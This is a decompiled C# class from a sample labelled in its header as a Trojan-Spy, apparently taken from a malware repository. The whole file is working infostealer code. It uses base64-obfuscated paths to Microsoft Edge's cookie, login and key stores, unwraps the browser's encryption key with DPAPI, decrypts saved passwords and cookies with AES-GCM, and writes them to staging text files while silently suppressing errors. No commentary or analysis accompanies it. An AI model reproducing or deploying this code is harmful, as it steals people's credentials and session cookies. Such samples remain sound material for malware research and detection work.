// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.Magazonch.balda23
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace AlphaCentavr.Magazonch
{
  public class balda23
  {
    public string mystafa = balda23.myfato("QzpcVXNlcnNc") + Environment.UserName + balda23.myfato("XEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcQ29va2llcw==");
    public string alegro = balda23.myfato("QzpcVXNlcnNc") + Environment.UserName + balda23.myfato("XEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==");
    public string uvlechenie = balda23.myfato("QzpcVXNlcnNc") + Environment.UserName + balda23.myfato("XEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXExvY2FsIFN0YXRl");
    public static string EdgePass;
    public static string EdgeCookies;

    private static string myfato(string kilo) => Encoding.ASCII.GetString(Convert.FromBase64String(kilo));

    public bool exitsuper() => File.Exists(this.mystafa);

    public bool KeyExists() => File.Exists(this.uvlechenie);

    public List<balda23.Passwords> nystifa(byte[] key)
    {
      List<balda23.Passwords> passwordsList = new List<balda23.Passwords>();
      if (!this.Mersikbensik())
        throw new FileNotFoundException(balda23.myfato("Q2FudCBmaW5kIHBhc3N3b3JkIHN0b3Jl"), this.alegro);
      using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + this.alegro + ";pooling=false"))
      {
        using (SQLiteCommand command = sqLiteConnection.CreateCommand())
        {
          ((DbCommand) command).CommandText = "SELECT origin_url,username_value,password_value FROM logins";
          ((DbConnection) sqLiteConnection).Open();
          using (SQLiteDataReader sqLiteDataReader = command.ExecuteReader())
          {
            while (((DbDataReader) sqLiteDataReader).Read())
              passwordsList.Add(new balda23.Passwords()
              {
                url = ((DbDataReader) sqLiteDataReader).GetString(0),
                password = this.DecryptWithKey((byte[]) ((DbDataReader) sqLiteDataReader)[2], key, 3),
                username = ((DbDataReader) sqLiteDataReader).GetString(1)
              });
          }
          ((DbConnection) sqLiteConnection).Close();
        }
      }
      return passwordsList;
    }

    public bool Mersikbensik() => File.Exists(this.alegro);

    public List<balda23.Cookie> tintobrass(byte[] key)
    {
      List<balda23.Cookie> cookieList = new List<balda23.Cookie>();
      if (!this.exitsuper())
        throw new FileNotFoundException("Cant find cookie store", this.mystafa);
      using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + this.mystafa + ";pooling=false"))
      {
        using (SQLiteCommand command = sqLiteConnection.CreateCommand())
        {
          ((DbCommand) command).CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
          ((DbConnection) sqLiteConnection).Open();
          using (SQLiteDataReader sqLiteDataReader = command.ExecuteReader())
          {
            while (((DbDataReader) sqLiteDataReader).Read())
            {
              cookieList.Add(new balda23.Cookie()
              {
                Name = ((DbDataReader) sqLiteDataReader).GetString(0),
                Value = this.DecryptWithKey((byte[]) ((DbDataReader) sqLiteDataReader)[1], key, 3),
                HostName = ((DbDataReader) sqLiteDataReader).GetString(2)
              });
              checked { ++ChelovechkivPope.rertrtebvbb; }
            }
          }
          ((DbConnection) sqLiteConnection).Close();
        }
      }
      return cookieList;
    }

    public byte[] GetKey() => ProtectedData.Unprotect(((IEnumerable<byte>) Convert.FromBase64String(((object) JObject.Parse(File.ReadAllText(this.uvlechenie))["os_crypt"][(object) "encrypted_key"]).ToString())).Skip<byte>(5).ToArray<byte>(), (byte[]) null, DataProtectionScope.LocalMachine);

    private string DecryptWithKey(byte[] msg, byte[] key, int nonSecretPayloadLength)
    {
      if (key == null || key.Length != 32)
        throw new ArgumentException(string.Format("Key needs to be {0} bit!", (object) 256), nameof (key));
      if (msg == null || msg.Length == 0)
        throw new ArgumentException("Message required!", "message");
      using (MemoryStream input = new MemoryStream(msg))
      {
        using (BinaryReader binaryReader = new BinaryReader((Stream) input))
        {
          binaryReader.ReadBytes(nonSecretPayloadLength);
          byte[] numArray1 = binaryReader.ReadBytes(12);
          GcmBlockCipher gcmBlockCipher = new GcmBlockCipher((IBlockCipher) new AesEngine());
          AeadParameters aeadParameters = new AeadParameters(new KeyParameter(key), 128, numArray1);
          gcmBlockCipher.Init(false, (ICipherParameters) aeadParameters);
          byte[] numArray2 = binaryReader.ReadBytes(msg.Length);
          byte[] bytes = new byte[gcmBlockCipher.GetOutputSize(numArray2.Length)];
          try
          {
            int num = gcmBlockCipher.ProcessBytes(numArray2, 0, numArray2.Length, bytes, 0);
            gcmBlockCipher.DoFinal(bytes, num);
          }
          catch (InvalidCipherTextException ex)
          {
            return (string) null;
          }
          return Encoding.Default.GetString(bytes);
        }
      }
    }

    public static void steg1()
    {
      try
      {
        StringBuilder stringBuilder1 = new StringBuilder();
        StringBuilder stringBuilder2 = new StringBuilder();
        balda23 balda23 = new balda23();
        Directory.CreateDirectory(glantrah.ekranirovan + balda23.myfato("XFxCcm93c2Vyc1xcRWRnZQ=="));
        balda23.EdgePass = glantrah.ekranirovan + balda23.myfato("XFxCcm93c2Vyc1xcRWRnZVxcUGFzc3dvcmRzX0VkZ2UudHh0");
        balda23.EdgeCookies = glantrah.ekranirovan + balda23.myfato("XFxCcm93c2Vyc1xcRWRnZVxcQ29va2llc19FZGdlLnR4dA==");
        if (balda23.exitsuper() && balda23.exitsuper() && balda23.KeyExists())
        {
          foreach (balda23.Passwords passwords in balda23.nystifa(balda23.GetKey()))
            stringBuilder1.AppendLine("   Host:    " + passwords.url + "    Username:   " + passwords.username + "    Password:    " + passwords.password + "\r\n");
          foreach (balda23.Cookie cookie in balda23.tintobrass(balda23.GetKey()))
            stringBuilder2.AppendLine(cookie.HostName + "    FALSE  \\  TRUE    1644287341.606948    " + cookie.Name + "  " + cookie.Value);
        }
        using (StreamWriter text = File.CreateText(balda23.EdgePass))
          text.Write((object) stringBuilder1);
        using (StreamWriter text = File.CreateText(balda23.EdgeCookies))
          text.Write((object) stringBuilder2);
      }
      catch (Exception ex)
      {
      }
    }

    public class Cookie
    {
      public string HostName { get; set; }

      public string Name { get; set; }

      public string Value { get; set; }
    }

    public class Cookiee
    {
      public string hostname { get; set; }

      public string name { get; set; }

      public string value { get; set; }
    }

    public class Passwords
    {
      public string url { get; set; }

      public string username { get; set; }

      public string password { get; set; }
    }
  }
}
